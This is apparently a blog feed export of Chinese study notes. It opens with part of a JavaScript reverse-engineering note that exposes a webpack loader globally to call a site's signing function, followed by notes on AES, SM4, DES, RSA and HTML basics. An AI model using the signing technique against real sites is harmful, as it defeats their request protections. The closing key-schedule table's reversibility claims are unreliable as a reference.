&#125;</span><br><span class="line">     </span><br><span class="line">                                                                                        </span><br><span class="line">                                                                                        console.<span class="title function_ invoke__">log</span>(JSON.<span class="title function_ invoke__">stringify</span>([    //异步情况下的py调用</span><br><span class="line">       <span class="string">&quot;ok&quot;</span>,&#123;</span><br><span class="line">        <span class="attr">t</span>:time,</span><br><span class="line">       <span class="attr">sign</span>:<span class="title function_ invoke__">sign</span>(page+<span class="string">&quot;|&quot;</span>+time)</span><br><span class="line">        &#125;</span><br><span class="line">    ]))                                                                                       </span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<h2 id="5异步log导出"><a class="markdownIt-Anchor" href="#5异步log导出"></a> 5.异步log导出:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">1</span>))</span><br></pre></td></tr></table></figure>
<h2 id="6webpack"><a class="markdownIt-Anchor" href="#6webpack"></a> 6.webpack:</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">都有类似这样的加载器:    </span><br><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> s = &#123;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s[t])</span><br><span class="line">            <span class="keyword">return</span> s[t].exports;</span><br><span class="line">        <span class="keyword">var</span> e = s[t] = &#123;</span><br><span class="line">            i: t,</span><br><span class="line">            l: !<span class="number">1</span>,</span><br><span class="line">            exports: &#123;&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">return</span> i[t].<span class="title function_ invoke__">call</span>(e.exports, e, e.exports, n),</span><br><span class="line">        e.l = !<span class="number">0</span>,</span><br><span class="line">        e.exports</span><br><span class="line">    &#125;</span><br><span class="line">    window.wanyan = n;     ---用全局对象去导出</span><br><span class="line">&#125;(&#123;</span><br><span class="line">                       ---这里面放加载的模块键值对的形式</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>JS_逆向</category>
      </categories>
  </entry>
  <entry>
    <title>aes</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81)/aes/</url>
    <content><![CDATA[<h1 id="aes加密"><a class="markdownIt-Anchor" href="#aes加密"></a> aes加密:</h1>
<h2 id="1特征"><a class="markdownIt-Anchor" href="#1特征"></a> 1.特征:</h2>
<table>
<thead>
<tr>
<th>属性</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>分组大小（Block）</td>
<td>固定为 <strong>128 位</strong>（16 字节）</td>
</tr>
<tr>
<td>密钥长度（Key）</td>
<td>可为 <strong>128 位 / 192 位 / 256 位</strong>（常用128位）</td>
</tr>
<tr>
<td>轮数（Rounds）</td>
<td>依据密钥长度不同：10（128位）、12（192）、14（256）</td>
</tr>
<tr>
<td>算法结构</td>
<td>基于 <strong>Substitution–Permutation Network（SPN）</strong></td>
</tr>
</tbody>
</table>
<h2 id="2aes的加密流程-密钥128位"><a class="markdownIt-Anchor" href="#2aes的加密流程-密钥128位"></a> 2.aes的加密流程 (密钥128位):</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入明文（128bit）</span><br><span class="line">      ↓</span><br><span class="line">AddRoundKey（初始轮）</span><br><span class="line">      ↓</span><br><span class="line">9轮：SubBytes(字节代换) → ShiftRows(行移位) → MixColumns(列混合) → AddRoundKey (轮密钥加)</span><br><span class="line">      ↓</span><br><span class="line">第10轮：SubBytes → ShiftRows → AddRoundKey    ---没有列混合</span><br><span class="line">      ↓</span><br><span class="line">输出密文（128bit）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>3.初始轮:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将明文状态矩阵与第 0 轮子密钥（RoundKey₀）做逐字节异或（XOR）操作。</span><br><span class="line">本质上是将密钥“注入”到加密流程的起点，为接下来的非线性变换和扩散做准备。</span><br></pre></td></tr></table></figure>
<h3 id="1问题"><a class="markdownIt-Anchor" href="#1问题"></a> 1.问题:</h3>
<p>明文是 128 位（16 字节），初始轮的 AddRoundKey 是对明文和密钥逐字节 XOR。如果我的密钥是 <strong>192 位或 256 位</strong>，那怎么 XOR 呢？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AES 不直接使用原始密钥参与加密，而是通过 密钥扩展（Key Schedule） 生成 每轮使用的“轮密钥”（Round Key）。不管原始密钥是 128、192 还是 256 位，每轮都只用一个 128 位的轮密钥。</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>原始密钥位数</th>
<th>总轮数</th>
<th>要生成的子密钥数量</th>
<th>每个子密钥长度</th>
</tr>
</thead>
<tbody>
<tr>
<td>128 位</td>
<td>10</td>
<td>11 个</td>
<td>128 位（16 字节）</td>
</tr>
<tr>
<td>192 位</td>
<td>12</td>
<td>13 个</td>
<td>128 位</td>
</tr>
<tr>
<td>256 位</td>
<td>14</td>
<td>15 个</td>
<td>128 位</td>
</tr>
</tbody>
</table>
<h2 id="4字节替代s盒"><a class="markdownIt-Anchor" href="#4字节替代s盒"></a> 4.字节替代(s盒):</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对 状态矩阵中的每个字节，使用一个固定的查找表（S-box）进行非线性映射替代</span><br><span class="line">是整个 AES 中引入非线性和抗线性分析攻击的核心步骤</span><br><span class="line">就是按字节查表:</span><br><span class="line">   比如某一个字节是0x53</span><br><span class="line">        高4位：5（行索引）</span><br><span class="line">        低4位：3（列索引）</span><br><span class="line">   然后去s盒表中找5行3列对应的字节值</span><br></pre></td></tr></table></figure>
<h2 id="5行移位"><a class="markdownIt-Anchor" href="#5行移位"></a> 5.行移位:</h2>
<p>按行左移字节就行了</p>
<table>
<thead>
<tr>
<th>行号</th>
<th>操作</th>
</tr>
</thead>
<tbody>
<tr>
<td>第0行</td>
<td>不变</td>
</tr>
<tr>
<td>第1行</td>
<td>循环左移 1 个字节</td>
</tr>
<tr>
<td>第2行</td>
<td>循环左移 2 个字节</td>
</tr>
<tr>
<td>第3行</td>
<td>循环左移 3 个字节（或右移1位）</td>
</tr>
</tbody>
</table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">打乱同一列字节之间的联系，让后续的 MixColumns 可以混合更多跨字节的数据；</span><br><span class="line">增强扩散性，使得明文的小改动能影响到加密后的多个字节；</span><br><span class="line">是一种 位置置换操作，没有改变字节本身的值。</span><br></pre></td></tr></table></figure>
<h2 id="6列混合"><a class="markdownIt-Anchor" href="#6列混合"></a> 6.列混合:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MixColumns（列混合） 是 AES 加密中每一轮的第 3 个操作（除了最后一轮不执行它），</span><br><span class="line">它通过矩阵乘法在 GF(2⁸) 有限域中，把每一列的4个字节混合生成新的4个字节。</span><br></pre></td></tr></table></figure>
<h2 id="7轮密钥加"><a class="markdownIt-Anchor" href="#7轮密钥加"></a> 7.轮密钥加:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当前状态矩阵与本轮的轮密钥（Round Key）逐字节进行按位异或（XOR）</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>特性</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>运算简单</td>
<td>仅使用按位异或（XOR），硬件友好</td>
</tr>
<tr>
<td>密钥注入点</td>
<td>是 AES 中 <strong>唯一使用密钥的地方</strong></td>
</tr>
<tr>
<td>可逆性强</td>
<td>XOR 的逆运算就是本身（再次 XOR 即可还原）</td>
</tr>
<tr>
<td>轮密钥变化</td>
<td>每轮使用不同的轮密钥（由原始密钥扩展）</td>
</tr>
</tbody>
</table>
<h2 id="8密钥扩展"><a class="markdownIt-Anchor" href="#8密钥扩展"></a> 8.密钥扩展:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">将原始密钥切成若干 32 位字（4字/6字/8字）</span><br><span class="line">每次迭代扩展一个 32 位字，共需 44/52/60 个字（每轮 4 个字）</span><br><span class="line"></span><br><span class="line">1. 初始密钥写入前 Nk 个字（Nk = 4/6/8）</span><br><span class="line">2. 对后续每一组（每组4字）：</span><br><span class="line">   - 如果当前索引 i 是 Nk 的倍数：</span><br><span class="line">     temp = SubWord(RotWord(w[i-1])) ⊕ Rcon[i/Nk]</span><br><span class="line">   - 否则如果 Nk &gt; 6 且 i ≡ 4 mod Nk：</span><br><span class="line">     temp = SubWord(w[i-1])</span><br><span class="line">   - 然后：w[i] = w[i-Nk] ⊕ temp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>项目</th>
<th>AES</th>
<th>DES</th>
<th>SM4</th>
</tr>
</thead>
<tbody>
<tr>
<td>原始密钥长度</td>
<td>128 / 192 / 256 bit</td>
<td>64 bit（含8位校验）</td>
<td>128 bit</td>
</tr>
<tr>
<td>有效密钥长度</td>
<td>128 / 192 / 256 bit</td>
<td>56 bit</td>
<td>128 bit</td>
</tr>
<tr>
<td>总轮数</td>
<td>10 / 12 / 14</td>
<td>16</td>
<td>32</td>
</tr>
<tr>
<td>每轮密钥长度</td>
<td>128 bit（16 字节）</td>
<td>48 bit</td>
<td>32 bit（1个字）</td>
</tr>
<tr>
<td>子密钥数量</td>
<td>轮数 + 1（11/13/15 个）</td>
<td>16 个</td>
<td>32 个</td>
</tr>
<tr>
<td>主要操作</td>
<td>字扩展 + S-box + XOR + 轮常量</td>
<td>置换 + 左移 + 压缩置换</td>
<td>XOR + S-box + 线性变换 + CK</td>
</tr>
<tr>
<td>是否非线性</td>
<td>✅（使用 S-box）</td>
<td>❌</td>
<td>✅（S-box + 线性组合）</td>
</tr>
<tr>
<td>是否可逆</td>
<td>❌</td>
<td>✅</td>
<td>❌（但结构对称）</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>渗透学习</category>
        <category>密码学</category>
        <category>对称密码(分组密码)</category>
      </categories>
  </entry>
  <entry>
    <title>sm4</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81)/sm4/</url>
    <content><![CDATA[<h1 id="sm4加密"><a class="markdownIt-Anchor" href="#sm4加密"></a> sm4加密:</h1>
<h2 id="1概念"><a class="markdownIt-Anchor" href="#1概念"></a> 1.概念:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SM4是一种分组密码算法，其分组长度为128位（即16字节，4字），密钥长度也为128位（即16字节，4字）。其加解密过程采用了32轮迭代机制（与DES、AES类似），每一轮需要一个轮密钥（与DES、AES类似）。</span><br></pre></td></tr></table></figure>
<h2 id="2加密流程"><a class="markdownIt-Anchor" href="#2加密流程"></a> 2.加密流程:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：128 位明文 + 128 位密钥</span><br><span class="line">↓</span><br><span class="line">1. 明文拆成 4 个 32 位字：X0, X1, X2, X3</span><br><span class="line">2. 密钥扩展：生成 32 个轮密钥 rk[0] ~ rk[31]</span><br><span class="line">3. 执行 32 轮加密：</span><br><span class="line">     对于每一轮 i = 0 到 31：</span><br><span class="line">         X[i+4] = X[i] ⊕ F(X[i+1], X[i+2], X[i+3], rk[i])</span><br><span class="line">4. 输出密文：X[35], X[34], X[33], X[32]（倒序输出）</span><br></pre></td></tr></table></figure>
<h2 id="3f函数"><a class="markdownIt-Anchor" href="#3f函数"></a> 3.F函数:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">F(X1, X2, X3, rk) = T(X1 ⊕ X2 ⊕ X3 ⊕ rk)</span><br><span class="line">输入：X1, X2, X3, rk</span><br><span class="line"></span><br><span class="line">Step 1:  temp = X1 ⊕ X2 ⊕ X3 ⊕ rk   → 32位</span><br><span class="line">Step 2:  替代 temp 的每个字节 → 使用 S-box → 得到非线性结果</span><br><span class="line">Step 3:  对结果进行线性变换 L(x)</span><br><span class="line">Step 4:  输出最终的 F 值（32 位）</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>功能类型</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>混淆性</strong>（Confusion）</td>
<td>通过 S-box 实现非线性映射，防止线性分析</td>
</tr>
<tr>
<td><strong>扩散性</strong>（Diffusion）</td>
<td>L 线性变换使得一个比特变化影响多个比特</td>
</tr>
<tr>
<td><strong>密钥注入</strong></td>
<td>引入轮密钥 rk[i]，确保每轮变换唯一</td>
</tr>
<tr>
<td><strong>加密推进器</strong></td>
<td>每轮根据 F 生成新状态字，实现 128 位数据演化</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>渗透学习</category>
        <category>密码学</category>
        <category>对称密码(分组密码)</category>
      </categories>
  </entry>
  <entry>
    <title>des</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81)/des/</url>
    <content><![CDATA[<h1 id="des加密"><a class="markdownIt-Anchor" href="#des加密"></a> des加密:</h1>
<h2 id="1基本概念"><a class="markdownIt-Anchor" href="#1基本概念"></a> 1.基本概念:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DES使用56位的密钥和64位的明文块进行加密。DES算法的分组大小是64位，因此，如果需要加密的明文长度不足64位，需要进行填充；如果明文长度超过64位，则需要使用分组模式进行分组加密。</span><br><span class="line">虽然DES算法的分组大小是64位，但是由于DES算法的密钥长度只有56位，因此DES算法存在着弱点，容易受到暴力破解和差分攻击等攻击手段的威胁。因此，在实际应用中，DES算法已经不再被广泛使用，而被更加安全的算法所取代，如AES算法等。</span><br></pre></td></tr></table></figure>
<h2 id="2加密流程"><a class="markdownIt-Anchor" href="#2加密流程"></a> 2.加密流程：</h2>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/13057fca8d2ae93a87bbceb559746832.png" alt="img" /></p>
<p>明文64位 → 初始置换（IP） → 16轮加密（Feistel结构） → 逆初始置换（IP⁻¹） → 密文64位</p>
<h3 id="f函数结构"><a class="markdownIt-Anchor" href="#f函数结构"></a> F函数结构:</h3>
<ol>
<li><strong>扩展置换 E：</strong>
<ul>
<li>将 32位的R 扩展为 48位（E表）<br />
⟹ 使其可以和 48位子密钥 <code>Ki</code> 做异或操作</li>
</ul>
</li>
<li><strong>异或：</strong>
<ul>
<li>48位扩展后的R 与 48位子密钥 <code>Ki</code> 做异或</li>
</ul>
</li>
<li><strong>S盒替换：</strong>
<ul>
<li>将 48位结果 分成 8组，每组6位</li>
<li>进入 8个 S-box（6位 → 4位）进行非线性变换</li>
<li>输出为 32位</li>
</ul>
</li>
<li><strong>P置换：</strong>
<ul>
<li>对S盒输出的32位进行 P置换，增强扩散</li>
</ul>
</li>
</ol>
<p>最终得到 F(R, Ki) 的输出（32位）</p>
<h2 id="3三重des"><a class="markdownIt-Anchor" href="#3三重des"></a> 3.三重des：</h2>
<blockquote>
<p><strong>EDE 模式（Encrypt → Decrypt → Encrypt）</strong></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密文 = E_K3(D_K2(E_K1(明文)))</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>E_K1：</strong> 用密钥K1进行DES加密</li>
<li><strong>D_K2：</strong> 用密钥K2进行DES解密</li>
<li><strong>E_K3：</strong> 再用密钥K3进行DES加密</li>
</ul>
<p>中间使用一次解密是为了:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果k1=k2=k3，那么这个3des就和普通的des一样了</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>密码学</category>
        <category>对称密码(分组密码)</category>
      </categories>
  </entry>
  <entry>
    <title>RAS</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81(%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81)/RAS/</url>
    <content><![CDATA[<h1 id="rsa"><a class="markdownIt-Anchor" href="#rsa"></a> RSA:</h1>
<p>建立在大整数因式分解难题</p>
<h2 id="1rsa流程"><a class="markdownIt-Anchor" href="#1rsa流程"></a> 1.RSA流程:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">生成密钥 → 加密 → 解密</span><br></pre></td></tr></table></figure>
<h2 id="2生成密钥"><a class="markdownIt-Anchor" href="#2生成密钥"></a> 2.生成密钥:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 选择两个大质数 </span><br><span class="line">   令：`p = 61, q = 53`</span><br><span class="line"></span><br><span class="line">2. 计算模数 n </span><br><span class="line">   `n = p × q = 61 × 53 = 3233`    ---这个 n 是 公钥 和 私钥 中共同的模数。</span><br><span class="line"></span><br><span class="line">3.计算欧拉函数 φ(n)</span><br><span class="line">   `φ(n) = (p - 1)(q - 1) = 60 × 52 = 3120`</span><br><span class="line"></span><br><span class="line">4. 选择加密指数 e  </span><br><span class="line">   `e = 17`（满足 `gcd(17, 3120) = 1`）</span><br><span class="line"></span><br><span class="line">5. 计算解密指数 d  </span><br><span class="line">   `d = e⁻¹ mod φ(n) = 2753`（因为 `17 × 2753 ≡ 1 mod 3120`）</span><br><span class="line"></span><br><span class="line">- ✅ 公钥：`(e, n) = (17, 3233)`</span><br><span class="line">- 🔒 私钥：`(d, n) = (2753, 3233)`</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="3加密流程"><a class="markdownIt-Anchor" href="#3加密流程"></a> 3.加密流程:</h2>
<p>首先，发送方需要知道接收方的<strong>公钥 (e, n)</strong>，其中：</p>
<ul>
<li>e 是加密指数，通常是一个公开的较小整数；</li>
<li>n 是两个大质数相乘得到的模数；</li>
<li>公钥是公开的，任何人都可以用来加密消息。</li>
</ul>
<p>接着，发送方将要发送的明文 M（需满足 0&lt;M&lt;n）使用以下公式进行加密：</p>
<p><strong>C = M^e mod n</strong></p>
<h2 id="4解密流程"><a class="markdownIt-Anchor" href="#4解密流程"></a> 4.解密流程:</h2>
<p>接收方收到密文 C 之后，使用自己的私钥 (d,n) 对密文进行解密。私钥中的 d 是在密钥生成阶段计算出来的，是加密指数 e 关于欧拉函数 φ(n) 的模反元素，即满足 e⋅d ≡ 1 mod  φ(n)</p>
<p>解密公式为：</p>
<p><strong>M = C^d mod n</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C = M^e mod n     ---加密得到C</span><br><span class="line">C^d mod n  --&gt; </span><br><span class="line">        ((M^e) mod n)^d mod n   --&gt;  M^ed mod n       ---幂模分配律</span><br><span class="line">ed=1  mod φ(n)   --&gt; ed=k(φ(n))+1</span><br><span class="line">M^(k(φ(n))+1) mod n --&gt; M</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>密码学</category>
        <category>非对称密码(公钥密码)</category>
      </categories>
  </entry>
  <entry>
    <title>html</title>
    <url>/2025/10/12/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/Front/html(%E7%BB%93%E6%9E%84%E6%A0%87%E5%87%86)/html/</url>
    <content><![CDATA[<h2 id="html的概述"><a class="markdownIt-Anchor" href="#html的概述"></a> html的概述:</h2>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTML 全称为 HyperText Markup Language，译为超文本标记语言。</span><br><span class="line">HTML 不是一种编程语言，是一种描述性的标记语言。</span><br><span class="line">作用：HTML是负责描述文档语义的语言。</span><br></pre></td></tr></table></figure>
<h2 id="骨架分析"><a class="markdownIt-Anchor" href="#骨架分析"></a> 骨架分析:</h2>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>    <span class="comment">&lt;!-- ✅ HTML5 标准文档声明 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>    <span class="comment">&lt;!-- 🌍 设置页面主语言为英文，可改为 &quot;zh-CN&quot; 表示简体中文 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="comment">&lt;!-- 📦 设置字符编码为 UTF-8，支持多语言 --&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>    <span class="comment">&lt;!-- 📱 移动端适配，确保响应式布局 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>&gt;</span> <span class="comment">&lt;!-- 📄 等价于 charset，兼容旧版浏览器，可保留也可省略 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;Author&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>&gt;</span>    <span class="comment">&lt;!-- 🧑‍💻 作者信息，可填写如 &quot;张三&quot; --&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;Keywords&quot;</span> <span class="attr">content</span>=<span class="string">&quot;厉&quot;</span> /&gt;</span>  <span class="comment">&lt;!-- 🔍 页面关键词，便于 SEO 搜索引擎优化 --&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;Description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;网易&quot;</span> /&gt;</span>  <span class="comment">&lt;!-- 📢 页面描述，在搜索结果中可能展示 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span>   <span class="comment">&lt;!-- 🏷️ 网页标题，显示在浏览器标签页 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="meta标签"><a class="markdownIt-Anchor" href="#meta标签"></a> meta标签:</h3>
<h4 id="1字符集charset"><a class="markdownIt-Anchor" href="#1字符集charset"></a> 1.字符集charset:</h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=UTF-8&quot;</span>&gt;</span></span><br><span class="line">   ---<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>字符集用meta标签中的<code>charset</code>定义，charset就是character set（即“字符集”），即<strong>网页的编码方式</strong>。</p>
<p><strong>字符集</strong>(Character set)是多个字符的集合。计算机要准确的处理各种字符集文字，需要进行字符编码，以便计算机能够识别和存储各种文字。</p>
<h4 id="2视口标签view"><a class="markdownIt-Anchor" href="#2视口标签view"></a> 2.视口标签view:</h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>width=device-width</code> ：表示视口宽度等于屏幕宽度。</p>
<p><code>initial-scale=1.0</code>:   设置网页的初始缩放比例为 1.0，也就是<strong>不缩放</strong>。</p>
<h4 id="3跳转标签-refresh"><a class="markdownIt-Anchor" href="#3跳转标签-refresh"></a> 3.跳转标签 refresh：</h4>
<meta http-equiv="refresh" content="3;http://www.baidu.com">  
<p>3秒后跳转百度</p>
<h3 id="body标签"><a class="markdownIt-Anchor" href="#body标签"></a> body标签:</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">onload	页面加载完成时执行 JS 代码	</span><br><span class="line">onresize	页面窗口大小改变时触发 JS 事件</span><br><span class="line">onbeforeunload	页面关闭前弹出确认提示	</span><br><span class="line">class	配合 CSS 设置样式</span><br><span class="line">id	设置唯一标识，供 JS 或 CSS 使用	</span><br></pre></td></tr></table></figure>
<h2 id="标签"><a class="markdownIt-Anchor" href="#标签"></a> 标签:</h2>
<h3 id="1排版标签"><a class="markdownIt-Anchor" href="#1排版标签"></a> 1.排版标签:</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span> = 段落，就像文章里的“自然段”</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span> = 分隔线，就像“分栏线”</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span> = 换行键（Enter）</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> = 大盒子，可以装一整块内容 必须单独占据一行</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span> = 小标签，用来标记某个词 不单独占一行</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span> = 打印机的原稿，不会自动排版</span><br><span class="line">    </span><br><span class="line">align=&quot;属性值&quot;    left、right、 center</span><br></pre></td></tr></table></figure>
<h3 id="2字体标签"><a class="markdownIt-Anchor" href="#2字体标签"></a> 2.字体标签:</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">特殊字符（转义字符）</span><br><span class="line"><span class="symbol">&amp;nbsp;</span>：空格 （non-breaking spacing，不断打空格）</span><br><span class="line"><span class="symbol">&amp;lt;</span>：小于号&lt;（less than）</span><br><span class="line"><span class="symbol">&amp;gt;</span>：大于号&gt;（greater than）</span><br><span class="line"><span class="symbol">&amp;amp;</span>：符号&amp;</span><br><span class="line"><span class="symbol">&amp;quot;</span>：双引号</span><br><span class="line"><span class="symbol">&amp;apos;</span>：单引号</span><br><span class="line"><span class="symbol">&amp;copy;</span>：版权©</span><br><span class="line"><span class="symbol">&amp;trade;</span>：商标™</span><br><span class="line"><span class="symbol">&amp;#32464;</span>：文字绐。其实，#32464是汉字绐的unicode编码。</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">u</span>&gt;</span>：下划线标记     ---Underline</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">s</span>&gt;</span>或<span class="tag">&lt;<span class="name">del</span>&gt;</span>：中划线标记（删除线）</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span>或<span class="tag">&lt;<span class="name">em</span>&gt;</span>：斜体标记</span><br><span class="line">    </span><br><span class="line">上标<span class="tag">&lt;<span class="name">sup</span>&gt;</span> 下标<span class="tag">&lt;<span class="name">sub</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="3超链接"><a class="markdownIt-Anchor" href="#3超链接"></a> 3.超链接:</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;02页面.html&quot;</span>&gt;</span>点击进入另外一个文件<span class="tag">&lt;/<span class="name">a</span>&gt;</span>      ---链接到外部链接</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#class&quot;</span>&gt;</span>点击进入另外一个文件<span class="tag">&lt;/<span class="name">a</span>&gt;</span>       ---链接到标签位置  锚点</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">属性:</span><br><span class="line">href：目标URL</span><br><span class="line">title：悬停文本。</span><br><span class="line">name：主要用于设置一个锚点的名称。</span><br><span class="line">target：告诉浏览器用什么方式来打开目标页面。target属性有以下几个值：</span><br><span class="line">    _self：在同一个网页中显示（默认值）</span><br><span class="line">    _blank：在新的窗口中打开。</span><br><span class="line">    _parent：在父窗口中显示</span><br><span class="line">    _top：在顶级窗口中显示</span><br></pre></td></tr></table></figure>
<h3 id="4图片标签"><a class="markdownIt-Anchor" href="#4图片标签"></a> 4.图片标签:</h3>
